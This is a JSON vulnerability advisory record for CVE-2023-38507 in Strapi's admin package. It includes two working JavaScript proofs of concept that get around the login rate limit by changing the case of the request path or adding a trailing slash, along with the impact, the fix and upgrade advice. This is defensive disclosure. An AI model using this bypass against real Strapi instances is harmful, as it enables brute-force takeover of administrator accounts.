{
  "Identifier": "CVE-2023-38507",
  "PackageSlug": "npm/@strapi/admin",
  "Title": "Strapi Improper Rate Limiting vulnerability",
  "Description": "### 1. Summary\nThere is a rate limit on the login function of Strapi's admin screen, but it is possible to circumvent it.\n\n### 2. Details\nIt is possible to avoid this by modifying the rate-limited request path as follows.\n1. Manipulating request paths to upper or lower case. (Pattern 1)\n  - In this case, avoidance is possible with various patterns.\n2. Add path slashes to the end of the request path. (Pattern 2)\n\n### 3. PoC\nAccess the administrator's login screen (`/admin/auth/login`) and execute the following PoC on the browser's console screen.\n\n#### Pattern 1 (uppercase and lowercase)\n```js\n// poc.js\n(async () =\u003e {\n const data1 = {\n  email: \"admin@strapi.com\",  // registered e-mail address\n  password: \"invalid_password\",\n };\n const data2 = {\n  email: \"admin@strapi.com\",\n  password: \"RyG5z-CE2-]*4e4\",  // correct password\n };\n\n for (let i = 0; i \u003c 30; i++) {\n  await fetch(\"http://localhost:1337/admin/login\", {\n   method: \"POST\",\n   body: JSON.stringify(data1),\n   headers: {\n    \"Content-Type\": \"application/json\",\n   },\n  });\n }\n\n const res1 = await fetch(\"http://localhost:1337/admin/login\", {\n  method: \"POST\",\n  body: JSON.stringify(data2),\n  headers: {\n   \"Content-Type\": \"application/json\",\n  },\n });\n console.log(res1.status + \" \" + res1.statusText);\n\n const res2 = await fetch(\"http://localhost:1337/admin/Login\", { // capitalize part of path\n  method: \"POST\",\n  body: JSON.stringify(data2),\n  headers: {\n   \"Content-Type\": \"application/json\",\n  },\n });\n console.log(res2.status + \" \" + res2.statusText);\n})();\n```\n\n##### This PoC does the following:\n1. Request 30 incorrect logins.\n4. Execute the same request again and confirm that it is blocked by rate limit from the console screen. (`429 Too Many Requests`)\n5. Next, falsify the pathname of the request (**`/admin/Login`**) and make a request again to confirm that it is possible to bypass the rate limit and log in. (`200 OK`)\n\n#### Pattern 2 (trailing slash)\n```js\n// poc.js\n(async () =\u003e {\n const data1 = {\n  email: \"admin@strapi.com\",  // registered e-mail address\n  password: \"invalid_password\",\n };\n const data2 = {\n  email: \"admin@strapi.com\",\n  password: \"RyG5z-CE2-]*4e4\",  // correct password\n };\n\n for (let i = 0; i \u003c 30; i++) {\n  await fetch(\"http://localhost:1337/admin/login\", {\n   method: \"POST\",\n   body: JSON.stringify(data1),\n   headers: {\n    \"Content-Type\": \"application/json\",\n   },\n  });\n }\n\n const res1 = await fetch(\"http://localhost:1337/admin/login\", {\n  method: \"POST\",\n  body: JSON.stringify(data2),\n  headers: {\n   \"Content-Type\": \"application/json\",\n  },\n });\n console.log(res1.status + \" \" + res1.statusText);\n\n const res2 = await fetch(\"http://localhost:1337/admin/login/\", { // trailing slash\n  method: \"POST\",\n  body: JSON.stringify(data2),\n  headers: {\n   \"Content-Type\": \"application/json\",\n  },\n });\n console.log(res2.status + \" \" + res2.statusText);\n})();\n```\n\n##### This PoC does the following:\n1. Request 30 incorrect logins.\n2. Execute the same request again and confirm that it is blocked by rate limit from the console screen. (`429 Too Many Requests`)\n3. Next, falsify the pathname of the request (**`/admin/login/`**) and make a request again to confirm that it is possible to bypass the rate limit and log in. (`200 OK`)\n\n\n\n### 4. Impact\nIt is possible to bypass the rate limit of the login function of the admin screen. \nTherefore, the possibility of unauthorized login by login brute force attack increases.\n\n### 5. Measures\nForcibly convert the request path used for rate limiting to upper case or lower case and judge it as the same path. (`ctx.request.path`)  \nAlso, remove any extra slashes in the request path.\n\n",
  "Date": "2023-09-13",
  "Pubdate": "2023-09-13",
  "AffectedRange": "\u003c4.12.1",
  "FixedVersions": [
    "4.12.1"
  ],
  "AffectedVersions": "All versions before 4.12.1",
  "NotImpacted": "All versions starting from 4.12.1",
  "Solution": "Upgrade to version 4.12.1 or above.",
  "Urls": [
    "https://github.com/strapi/strapi/security/advisories/GHSA-24q2-59hm-rh9r",
    "https://github.com/strapi/strapi/releases/tag/v4.12.1",
    "https://github.com/advisories/GHSA-24q2-59hm-rh9r"
  ],
  "CvssV2": "",
  "CvssV3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
  "UUID": "d793d342-2e05-4f34-9fd7-ad8a90b53c19"
}